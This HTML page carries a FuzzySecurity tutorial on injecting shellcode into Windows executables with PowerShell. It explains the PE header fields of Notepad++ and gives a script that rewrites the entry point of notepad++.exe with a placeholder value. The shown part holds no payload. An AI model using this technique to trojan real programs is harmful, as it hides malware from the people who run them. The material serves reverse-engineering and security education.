@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Powershell PE Injection</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../css/shCoreEmacs.css"/>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+	
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../js/shCore.js"></script>
+	<script type="text/javascript" src="../js/shBrushPowerShell.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../index.html">Home</a>
+            </li>
+            <li><a href="../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../coding.html">Scripting</a>
+            </li>
+            <li><a href="../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../links.html">Links</a>
+            </li>
+            <li><a href="../patreon.html">Patreon</a></li><li><a href="../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Powershell PE Injection: This is not the Calc you are looking for!</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Powershell PE Injection: This is not the Calc you are looking for!<span class="line"></span></h2>
+
+      <div class="fourteen columns bottom">
+<p>Hello and welcome! Today we will look at programmatically injecting shellcode into PE executables on disk. Please take note that we are only talking about exe's, the PE file format includes many other extensions (dll, ocx, sys, cpl, fon,..). Doing this manually is moderately straightforward. The key point is to make sure the PE functionality is unchanged so as not to raise suspicion. Unfortunately manual injection is not always practical. You need to copy the PE out, modify it on your host and then replace it on the target machine. To simplify this process I created Subvert-PE which can dynamically rewrite a PE executable (x86 & x64): Patch the Entry Point offset, inject shellcode and hand execution flow back over to the legitimate code.<br /><br />
+
+I don't like to put a tool in the hands of people without them having the opportunity to understand how it works. As such a large part of this post will focus on examining the relevant sections of the PE format. Once the PE structure is understood, modifying it with Powershell becomes an exercise in calculating array offsets.<br /><br />
+
+This post may contain information/extracts/images from the official Microsoft documentation listed below. This information is presented under the DMCA fair use policy. If anyone has an issue with this please send me an email.<br /><br />
+
+<font color=#ffffff><strong>Links:</strong></font><br />
+Microsoft Official PE-COFF Documentation (MSDN) - <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680547%28v=vs.85%29.aspx">here</a><br />
+Portable Executable (Corkami) - <a href="https://code.google.com/p/corkami/wiki/PE">here</a><br /><br />
+
+<font color=#ffffff><strong>Tool:</strong></font><br />
+Subvert-PE.ps1 - <a href="files/Subvert-PE.rar">here</a></p>
+
+<h2 class="title">The PE Header<span class="line"></span></h2>
+<p>I always think a concrete example is the best way to learn about new subject matter. To ground the theory in practise we will be stepping through the 32-bit Notepad++ PE header. PE headers generally include the following components: MS-DOS Header, Rich Signature, PE Header, Optional Header and Section Table.<br /><br />
+
+I will not highlight every significant WORD/DWORD/QWORD for each section as this is meant to be more of a cursory overview.</p><br />
+
+<p><font color=#ffffff><strong>MS-DOS Header:</strong></font><br />
+In this example, specifically, the DOS header stretches from the base of the image (0x00) up to 0x7F (127 bytes).</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>        0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F
+       --|--|--|--|--|--|--|--|--|--|--|--|--|--|--|--
+0000h: <span style="background-color:#A9F5A9;">4D 5A</span> 90 00 <span style="background-color:#F5A9A9;">03 00</span> 00 00 04 00 00 00 FF FF 00 00  MZ.........ÿÿ.. 
+0010h: B8 00 00 00 00 00 00 00 <span style="background-color:#F5DA81;">40 00</span> 00 00 00 00 00 00  ¸.......@....... 
+0020h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 
+0030h: 00 00 00 00 00 00 00 00 00 00 00 00 <span style="background-color:#81BEF7;">F0 00 00 00</span>  ............ð... 
+0040h: <span style="background-color:#9F81F7;">0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68</span>  ..º..´.Í!¸.LÍ!Th 
+0050h: <span style="background-color:#9F81F7;">69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F</span>  is program canno 
+0060h: <span style="background-color:#9F81F7;">74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20</span>  t be run in DOS  
+0070h: <span style="background-color:#9F81F7;">6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00</span>  mode....$....... 
+
+TYPE             | Value              | Significance
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#A9F5A9;"> e_magic         </span>| 0x4D5A (MZ)        | Used to identify MS-DOS compatibility.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#F5A9A9;"> e_cp            </span>| 0x0003             | File size in pages.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#F5DA81;"> e_lfarlc        </span>| 0x0040             | Address of relocation table.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#81BEF7;"> e_lfanew        </span>| 0x000000F0 (240)   | Offset to PE header.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#9F81F7;"> MS-DOS Stub     </span>|         *          | Legacy DOS stub (Windows 3.1 compatibility check).
+</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>The main thing to remember here is that, at an offset of 0x3c (60-bytes), there is a DWORD which provides the offset to the actual PE header. The PE header offset is not static and will change from binary to binary. Also, for those interested, the static "MZ" identifier corresponds to the initials of Mark Zbikowski, one of developers of MS-DOS.<br /><br />
+
+<font color=#ffffff><strong>Rich Signature:</strong></font><br />
+The "Rich Signature" is mentioned here mostly as a curiosity. Though the PE format has a long history (Windows 3.1 - 1993), this section has gone undocumented by Microsoft. To make a long story short, it stores data about the compilation of the PE. For an in-depth overview you can read Daniel Pistelli analysis on <a href="http://www.ntcore.com/files/richsign.htm">NTCore</a>.</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>        0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F
+       --|--|--|--|--|--|--|--|--|--|--|--|--|--|--|--
+0080h: 37 BA 5C 86 73 DB 32 D5 73 DB 32 D5 73 DB 32 D5  7º\†sÛ2ÕsÛ2ÕsÛ2Õ 
+0090h: E4 1F 4C D5 77 DB 32 D5 54 1D 4F D5 6A DB 32 D5  ä.LÕwÛ2ÕT.OÕjÛ2Õ 
+00A0h: 54 1D 5F D5 CF DB 32 D5 B0 D4 6F D5 60 DB 32 D5  T._ÕÏÛ2Õ°ÔoÕ`Û2Õ 
+00B0h: 73 DB 33 D5 E8 DA 32 D5 54 1D 5C D5 D7 DB 32 D5  sÛ3ÕèÚ2ÕT.\Õ×Û2Õ 
+00C0h: 54 1D 4E D5 72 DB 32 D5 73 DB 32 D5 67 DB 32 D5  T.NÕrÛ2ÕsÛ2ÕgÛ2Õ 
+00D0h: 54 1D 4A D5 72 DB 32 D5 52 69 63 68 73 DB 32 D5  T.JÕrÛ2Õ<span style="background-color:#A9F5A9;">Rich</span>sÛ2Õ 
+
+TYPE             | Value              | Significance
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#A9F5A9;"> MSLinkerRich    </span>|         *          | Section named for ASCII sequence "Rich".
+</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p><font color=#ffffff><strong>PE Header:</strong></font><br />
+The PE header consists of an ASCII signature followed by a standard COFF file header. It should be noted that there is null-byte padding between the Rich Signature and the PE header. For Notepad++ specifically this padding has a size of 0x0F (15-bytes), but it does vary from PE to PE.</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>        0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F
+       --|--|--|--|--|--|--|--|--|--|--|--|--|--|--|--
+00E0h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................  <span style="color:#990066;"><strong># 0x0F null-byte padding</strong></span>
+00F0h: <span style="background-color:#A9F5A9;">50 45 00 00</span> <span style="background-color:#F5A9A9;">4C 01</span> <span style="background-color:#F5DA81;">04 00</span> <span style="background-color:#81BEF7;">7F A4 74 50</span> 00 00 00 00  PE..L..¤tP.... 
+0100h: 00 00 00 00 <span style="background-color:#9F81F7;">E0 00</span> <span style="background-color:#FFFFFF;">02 01</span>                          ....à...
+
+
+TYPE             | Value              | Significance
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#A9F5A9;"> PE Signature    </span>| 0x504500 (PE\0\0)  | ASCII PE format signature.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#F5A9A9;"> Machine Type    </span>| 0x014C (i386+)     | Identifies the target machine architecture.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#F5DA81;"> Number Of       </span>| 0x0004             | Number of sections in the PE. Section table follows the
+<span style="background-color:#F5DA81;"> Sections        </span>|                    | "Optional Header".
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#81BEF7;"> TimeDateStamp   </span>| 0x5074A47F         | Time-stamp indicating when the file was created.
+<span style="background-color:#81BEF7;">                 </span>| 10/09/12 22:26:07  | (Seconds since 00:00 January 1, 1970)
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#9F81F7;"> Optional        </span>| 0x00E0 (224)       | Size of the Optional Header.
+<span style="background-color:#9F81F7;"> Header Size     </span>|                    |
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#FFFFFF;"> Characteristics </span>| 0x0102 (32-bit)    | Flag contains attributes of the object or image.
+</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>To provide a more complete picture you can find all the possible values of the "Machine Type" and "Characteristics" fields below. These have been taken from the official Microsoft documentation.</p>
+
+    <p>&nbsp;</p>
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/PE_1_Big.png" rel="prettyPhoto[PowerPE]">
+          <img src="images/PE_1_Small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Machine Type</p>
+      </div>
+      
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/PE_2_Big.png" rel="prettyPhoto[PowerPE]">
+          <img src="images/PE_2_Small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Characteristics</p>
+      </div>
+    
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p><font color=#ffffff><strong>Optional Header:</strong></font><br />
+The Optional Header provides information to the loader. This section is only optional in the sense that it is not present in object files, generally it is mandatory. The size of this header varies and is denoted by the "Optional Header Size" in the PE header above.</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>        0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F
+       --|--|--|--|--|--|--|--|--|--|--|--|--|--|--|--
+0100h:                         <span style="background-color:#A9F5A9;">0B 01</span> 08 00 <span style="background-color:#F5A9A9;">00 A0 0D 00</span>          ..... .. 
+0110h: <span style="background-color:#F5DA81;">00 40 0B 00</span> 00 00 00 00 <span style="background-color:#81BEF7;">59 71 0B 00</span> <span style="background-color:#9F81F7;">00 10 00 00</span>  .@......Yq...... 
+0120h: <span style="background-color:#FFFFFF;">00 B0 0D 00</span> <span style="background-color:#01DFD7;">00 00 40 00</span> 00 10 00 00 00 10 00 00  .°....@......... 
+0130h: 04 00 00 00 01 00 00 00 04 00 00 00 00 00 00 00  ................ 
+0140h: <span style="background-color:#C8FE2E;">00 20 1A 00</span> <span style="background-color:#FF8000;">00 10 00 00</span> 00 00 00 00 <span style="background-color:#FA58D0;">02 00</span> 00 00  . .............. 
+0150h: 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00  ................ 
+0160h: 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00  ................ 
+0170h: C4 0A 10 00 C8 00 00 00 00 30 12 00 6C EA 07 00  Ä...È....0..lê.. 
+0180h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 
+0190h: 00 00 00 00 00 00 00 00 10 B7 0D 00 1C 00 00 00  .........·...... 
+01A0h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 
+01B0h: 00 00 00 00 00 00 00 00 80 0C 0F 00 40 00 00 00  ........€...@... 
+01C0h: 00 00 00 00 00 00 00 00 00 B0 0D 00 7C 06 00 00  .........°..|... 
+01D0h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 
+01E0h: 00 00 00 00 00 00 00 00                          ........         
+
+
+TYPE             | Value              | Significance
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#A9F5A9;"> Magic Number    </span>| 0x010B (PE32)      | 0x010B (PE32) Or 0x020B (PE32+).
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#F5A9A9;"> Code            </span>| 0x000DA000 (892928)| Sum of the size of code sections.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#F5DA81;"> Initialised     </span>| 0x000B4000 (737280)| Sum of the size of initialised data sections.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#81BEF7;"> Entry Point     </span>| 0x000B7159         | Offset to Entry Point.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#9F81F7;"> Base Of Code    </span>| 0x00001000         | Start of the code section relative to the image base.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#FFFFFF;"> Base Of Data    </span>| 0x000DB000         | Start of the data section relative to the image base.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#01DFD7;"> Image Base      </span>| 0x00400000         | Preferred image base.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#C8FE2E;"> Image Size      </span>| 0x001A2000         | Size of the image in memory including headers.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#FF8000;"> Header Size     </span>| 0x00001000         | Combined size of headers (rounded up to FileAlignment).
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#FA58D0;"> Subsystem Type  </span>| 0x0002 (Win GUI)   | Subsystem required for PE.
+</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>As you can see, many sections have not been highlighted. For a more complete overview of the Optional header please refer to the official Microsoft documentation and the Corkami analysis <a href="https://code.google.com/p/corkami/wiki/PE#Optional_Header">here</a>. The image below shows all possible values of the "Subsystem Type" field.</p>
+
+    <p>&nbsp;</p>
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/PE_3_Big.png" rel="prettyPhoto[PowerPE]">
+          <img src="images/PE_3_Small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Subsystem Type</p>
+      </div>
+    
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p><font color=#ffffff><strong>Section Table:</strong></font><br />
+The Section table immediately follows the Optional header. This order is required as the image does not contain a pointer to the section table, instead the offset is calculated based on the combined size of the PE headers. Each defined section has a size of 0x28 (40 bytes), the number of sections can be retrieved from the PE header.</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>        0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F
+       --|--|--|--|--|--|--|--|--|--|--|--|--|--|--|--
+01E0h:                         <span style="background-color:#A9F5A9;">2E 74 65 78 74 00 00 00</span>          .text... 
+01F0h: <span style="background-color:#F5A9A9;">B6 96 0D 00</span> <span style="background-color:#F5DA81;">00 10 00 00</span> <span style="background-color:#81BEF7;">00 A0 0D 00</span> <span style="background-color:#9F81F7;">00 10 00 00</span>  ¶–....... ...... 
+0200h: 00 00 00 00 00 00 00 00 00 00 00 00 <span style="background-color:#FFFFFF;">20 00 00 20</span>  ............ ..` 
+
+
+
+TYPE             | Value              | Significance
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#A9F5A9;"> Section Name    </span>| .text              | 8 byte, null padded UTF8 string.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#F5A9A9;"> Virtual Size    </span>| 0x000D96B6 (890550)| Total size of the section when loaded into memory.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#F5DA81;"> Virtual Address </span>| 0x00001000         | Offset to the section when loaded into memory (relative to
+<span style="background-color:#F5DA81;">                 </span>|                    | the image base).
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#81BEF7;"> Raw Data Size   </span>| 0x000DA000 (892928)| Size of the section on disk.
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#9F81F7;"> Raw Data Pointer</span>| 0x00001000         | File pointer to the first page of the section within the
+<span style="background-color:#9F81F7;">                 </span>|                    | COFF file (rounded up to FileAlignment).
+-------------------------------------------------------------------------------------------------
+<span style="background-color:#FFFFFF;"> Section Flags   </span>| 0x20000020         | Characteristics of the section.
+<span style="background-color:#FFFFFF;">                 </span>| (Read & Execute)   |
+</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>The images below show all possible section flag values. Generally however only a select few will appear regularly (Readable/Executable, Initialized Data, Disgardable).</p><br />
+
+    <p>&nbsp;</p>
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/PE_4_Big.png" rel="prettyPhoto[PowerPE]">
+          <img src="images/PE_4_Small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Section Flags - 1</p>
+      </div>
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/PE_5_Big.png" rel="prettyPhoto[PowerPE]">
+          <img src="images/PE_5_Small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Section Flags - 2</p>
+      </div>
+    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+          <div class="caption">
+          <a href="images/PE_6_Big.png" rel="prettyPhoto[PowerPE]">
+          <img src="images/PE_6_Small.png" alt="" class="pic" />
+          <span class="hover-effect zoom"></span></a>
+          </div><!-- hover effect -->
+          <p>Section Flags - 3</p>
+      </div>
+    
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>The table above only shows the first section of the Notepad++ PE. The other sections (we know there are 4 in total), directly follow the ".text" section.</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>        0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F
+       --|--|--|--|--|--|--|--|--|--|--|--|--|--|--|--
+0210h: <span style="background-color:#A9F5A9;">2E 72 64 61 74 61 00 00</span> <span style="background-color:#F5A9A9;">B8 7D 02 00</span> <span style="background-color:#F5DA81;">00 B0 0D 00</span>  .rdata..¸}...°.. 
+0220h: <span style="background-color:#81BEF7;">00 80 02 00</span> <span style="background-color:#9F81F7;">00 B0 0D 00</span> 00 00 00 00 00 00 00 00  .€...°.......... 
+0230h: 00 00 00 00 <span style="background-color:#FFFFFF;">40 00 00 40</span>                          ....@..@
+
+0230h:                         <span style="background-color:#A9F5A9;">2E 64 61 74 61 00 00 00</span>          .data... 
+0240h: <span style="background-color:#F5A9A9;">68 FF 01 00</span> <span style="background-color:#F5DA81;">00 30 10 00</span> <span style="background-color:#81BEF7;">00 D0 00 00</span> <span style="background-color:#9F81F7;">00 30 10 00</span>  hÿ...0...Ð...0.. 
+0250h: 00 00 00 00 00 00 00 00 00 00 00 00 <span style="background-color:#FFFFFF;">40 00 00 C0</span>  ............@..À 
+
+0260h: <span style="background-color:#A9F5A9;">2E 72 73 72 63 00 00 00</span> <span style="background-color:#F5A9A9;">6C EA 07 00</span> <span style="background-color:#F5DA81;">00 30 12 00</span>  .rsrc...lê...0.. 
+0270h: <span style="background-color:#81BEF7;">00 F0 07 00</span> <span style="background-color:#9F81F7;">00 00 11 00</span> 00 00 00 00 00 00 00 00  .ð.............. 
+0280h: 00 00 00 00 <span style="background-color:#FFFFFF;">40 00 00 40</span>                          ....@..@
+</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<h2 class="title">Manipulate Binary Files With Powershell<span class="line"></span></h2>
+<p>Now we have a rudimentary understanding of the PE header format we can start looking at reading bytes from and writing bytes to binary files.<br /><br />
+
+<font color=#ffffff><strong>Manipulating An Array:</strong></font><br />
+The first thing we should look at it how to convert between hex bytes to integers and vice-versa.</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># Hex --> Int</strong></span>
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>0xA</span>
+10
+
+<span style="color:#990066;"><strong># Int --> Hex</strong></span>
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>'{0:X}' -f 256</span>
+FF
+
+<span style="color:#990066;"><strong># Mixed values</strong></span>
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>0xAA + 187</span>
+357
+
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>'{0:X}' -f (0xCC-8)</span>
+C4
+
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>'{0:X}' -f (((81*0x51*8)-((0x359*0x10)/2))+((0x1*15)+0xf0))</span>
+B33F <span style="color:#990066;"><strong># Because Math ;))</strong></span></pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>Very amusing, but the main objective remains editing files on disk. I created a simple 4 byte file to illustrate how this can be achieved.</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>type .\test.bin</span>
+ª»ÌÝ
+
+<span style="color:#990066;"><strong># Read the file into a byte array</strong></span>
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>$read = [System.IO.File]::ReadAllBytes('C:\Users\b33f\test.bin')</span>
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>$read</span>
+170
+187
+204
+221
+
+<span style="color:#990066;"><strong># We can query individual array elements</strong></span>
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>$read[0,3]</span>
+170
+221
+
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>'0x{0}' -f ((($read[0..3]) | % {$_.ToString('X2')}) -join '')</span>
+0xAABBCCDD
+
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>[UInt32]('0x{0}' -f ((($read[0..3]) | % {$_.ToString('X2')}) -join ''))</span>
+2864434397
+
+<span style="color:#990066;"><strong># We can assign new values to array elements</strong></span>
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>$read[2] = 255</span>
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>$read[3] = 0xff</span>
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>'0x{0}' -f ((($read[0..3]) | % {$_.ToString('X2')}) -join '')</span>
+0xAABBFFFF
+
+<span style="color:#990066;"><strong># Finally we can overwrite the file with our modified byte array</strong></span>
+PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>[System.IO.File]::WriteAllBytes('C:\Users\b33f\test.bin', $read)</span>
+</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p><font color=#ffffff><strong>Editing PE Images:</strong></font><br />
+Time to put all this theory into practise. To come to grips with editing PE's we we will set ourselves a simple goal, to find the module entry point offset and overwrite it with 0xAABBCCDD.</p>
+
+<div class="eighteen columns bottom">
+    <div class="main_wrap_support">
+<pre class="brush: ps;gutter:false;auto-links: false;;">
+# Read entire PE array into memory
+$bytes = [System.IO.File]::ReadAllBytes('C:\Users\b33f\Desktop\notepad++.exe')
+
+# PE Header offset at 0x3c (60-byes), little endian!
+$PEOffset = [Int32] ('0x{0}' -f (($bytes[63..60] | % {$_.ToString('X2')}) -join ''))
+echo "PE Header Offset: $PEOffset"
+
+# Optional Header = PE Header + 0x18 (24-bytes)
+$OptOffset = $PEOffset + 24
+echo "Optional Header Offset: $OptOffset"
+
+# Module Entry Point = Optional Header + 0x14 (20-bytes)
+$EntryPoint = '0x{0}' -f ((($bytes[($OptOffset+19)..($OptOffset+16)]) | % {$_.ToString('X2')}) -join '')
+echo "Original Entry Point Offset: $EntryPoint"
+
+$bytes[$OptOffset+19] = 0xAA
+$bytes[$OptOffset+18] = 0xBB
+$bytes[$OptOffset+17] = 0xCC
+$bytes[$OptOffset+16] = 0xDD
+
+# Fetch New Entry Point
+$EntryPoint = '0x{0}' -f ((($bytes[($OptOffset+19)..($OptOffset+16)]) | % {$_.ToString('X2')}) -join '')
+echo "New Entry Point Offset: $EntryPoint"
+
+# Overwrite the PE with the modified array
+[System.IO.File]::WriteAllBytes('C:\Users\b33f\Desktop\notepad++.exe', $bytes)</pre>
+</div>
+  </div>
+  
+<p>Running this script in the terminal yields the following results.</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>PS <span style='color:#ff0000;'>C:\Users\b33f</span>> <span style='color:#2B8156;'>.\Write-Pointer.ps1</span>
+PE Header Offset: 240
+Optional Header Offset: 264
+Original Entry Point Offset: 0x000B7159
+New Entry Point Offset: 0xAABBCCDD
+</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>Let's see what happens when we load the PE in Immunity.</p><p>&nbsp;</p>
+
+<img src="images/PE_7_Big.png" alt="" class="pic" /><p>&nbsp;</p>
+
+<p>You will notice that the entry point is not 0xAABBCCDD but 0xAAFBCCDD. This is expected as the entry point offset is added to the image base (0x00400000) when the PE is loaded into memory. From our perspective this is not important as any dynamic calculations we make will be automatically added to the image base. This value can be static or dynamic in case of rebase/ASLR.</p><p>&nbsp;</p>
+
